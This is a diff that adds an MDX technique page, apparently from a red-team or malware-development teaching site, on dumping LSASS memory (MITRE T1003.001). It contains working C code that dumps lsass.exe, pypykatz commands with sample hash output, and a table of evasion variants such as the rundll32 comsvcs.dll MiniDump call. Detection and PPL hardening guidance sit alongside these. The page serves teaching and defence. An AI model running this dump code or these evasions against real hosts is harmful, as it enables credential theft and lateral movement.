@@ -1,0 +1,181 @@
+---
+title: LSASS Memory Dump
+mitre: T1003.001
+category: credential-access
+group: Memory Credential Theft
+summary: Extract credential material from lsass.exe memory to recover plaintext passwords and hashes.
+platform: [Windows]
+tags: ['C / C++', 'PowerShell', 'LSASS']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 9 min read
+callChain:
+  - call: OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
+    desc: Acquire a handle to lsass.exe — this handle open is the loudest, most-logged step.
+    dll: kernel32
+  - call: MiniDumpWriteDump
+    desc: Write a full process minidump to disk or to a pipe for in-memory extraction.
+    dll: dbghelp
+  - call: (optional) parse dump offline
+    desc: Run Mimikatz or pypykatz against the minidump file on an analyst box, outside the target.
+    dll: —
+detections:
+  - src: SYSMON EID 10
+    text: A non-system process opening lsass.exe with PROCESS_VM_READ access rights.
+  - src: ETW-TI
+    text: ReadProcessMemory targeting lsass.exe from any process other than Windows Defender or AV.
+  - src: MICROSOFT DEFENDER
+    text: ASR rule "Block credential stealing from the Windows local security authority subsystem".
+  - src: BEHAVIOURAL
+    text: dbghelp.dll loaded by a non-developer process, followed by MiniDumpWriteDump targeting lsass.
+  - src: LSASS PPL
+    text: If lsass runs as a Protected Process Light, OpenProcess for VM_READ returns access denied — dump attempt is logged.
+related:
+  - mitre: T1134.001
+    title: Token Impersonation
+    desc: Once you have hashes, token theft is the next lateral-movement step.
+    href: /techniques/credential-access/token-impersonation
+  - mitre: T1550.002
+    title: Pass-the-Hash
+    desc: NTLM hashes extracted from LSASS can authenticate without cracking.
+  - mitre: T1003.006
+    title: DCSync
+    desc: Pull credentials from AD without ever touching lsass on a domain controller.
+labKit:
+  - label: lsass_dump.c + Makefile
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+  - label: Detonation VM profile
+    href: /toolkit
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+`lsass.exe` caches authentication material for every interactive and network session on a
+Windows host: NTLM hashes, Kerberos tickets, and — when WDigest is enabled — cleartext
+passwords. Dumping it gives an attacker a local credential store they can take offline, crack,
+or use directly for lateral movement.
+
+Because the technique is so well-known, every tier of the Windows security stack now has
+detection or prevention for it: Sysmon EID 10, ASR rules, Protected Process Light, Credential
+Guard. None of these are universal — each has a bypass — but the combined effect is that a naive
+`MiniDumpWriteDump` is caught within seconds on a hardened host.
+
+<Callout type="caution">
+  On hosts with Credential Guard enabled, NTLM hashes and Kerberos material are stored in an
+  isolated VTL1 process (`LsaIso.exe`). Even a successful LSASS dump returns no useful
+  credentials. The attack surface shifts to TGT abuse and DCSync.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Standard dump (MiniDumpWriteDump)
+
+<CodeBlock
+  file="lsass_dump.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+#include \u003cdbghelp.h\u003e
+#include \u003ctlhelp32.h\u003e
+#pragma comment(lib, "dbghelp.lib")
+
+static DWORD find_lsass_pid(void) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe = { .dwSize = sizeof pe };
+    DWORD pid = 0;
+    if (Process32FirstW(snap, &pe))
+        do {
+            if (!_wcsicmp(pe.szExeFile, L"lsass.exe")) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(snap, &pe));
+    CloseHandle(snap);
+    return pid;
+}
+
+void dump_lsass(const wchar_t *outpath) {
+    DWORD pid = find_lsass_pid();
+    if (!pid) return;
+
+    // SeDebugPrivilege is required — assumes already elevated
+    HANDLE proc = OpenProcess(
+        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+
+    HANDLE file = CreateFileW(outpath, GENERIC_WRITE, 0, NULL,
+                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    MiniDumpWriteDump(proc, pid, file,
+                      MiniDumpWithFullMemory,
+                      NULL, NULL, NULL);
+
+    CloseHandle(file);
+    CloseHandle(proc);
+}`}
+/>
+
+### Parse offline with pypykatz
+
+<CodeBlock
+  file="parse.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# copy lsass.dmp to analyst box, parse without running anything on target
+$ pip install pypykatz
+$ pypykatz lsa minidump lsass.dmp
+
+INFO:root:Parsing file lsass.dmp
+FILE: ======== lsass.dmp =======
+== LogonSession ==
+authentication_id 123456 (1e240)
+session            1
+username           Administrator
+domainname         CORP
+logon_server       DC01
+== MSV ==
+[0] Primary
+  * Username : Administrator
+  * Domain   : CORP
+  * NT       : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+== DPAPI ==
+  * masterkey  : ...`}
+/>
+
+## Evasion variants
+
+| Technique | Principle | Detection delta |
+|---|---|---|
+| `MiniDumpWriteDump` to a pipe | Dump never touches disk | Still needs PROCESS_VM_READ handle |
+| `NtReadVirtualMemory` directly | Avoids `dbghelp.dll` import | ETW-TI still logs cross-process reads |
+| `ProcDump -ma lsass` | Signed Microsoft binary | Binary allowlist bypass; Sysmon still logs |
+| Shadow copy / Volume Shadow | Read `lsass.DMP` from a VSS snapshot | No handle to live process; needs admin |
+| Comsvcs.dll `MiniDump` via rundll32 | `rundll32.exe comsvcs.dll,MiniDump <pid>` | Signed binary proxy; well-known bypass |
+| Kernel driver direct read | Bypass PPL from Ring 0 | Requires signed or exploited driver |
+
+The common thread: every variant that reads live LSASS memory must open the process with
+`PROCESS_VM_READ`, and that handle open is recorded by `EID 10` regardless of which API follows.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+PPL is the highest-ROI preventive control. Enable it via `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 2`
+and confirm with `!process 0 0 lsass.exe` in WinDbg — the protection level field should read `PsProtectedSignerLsa-Light`.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
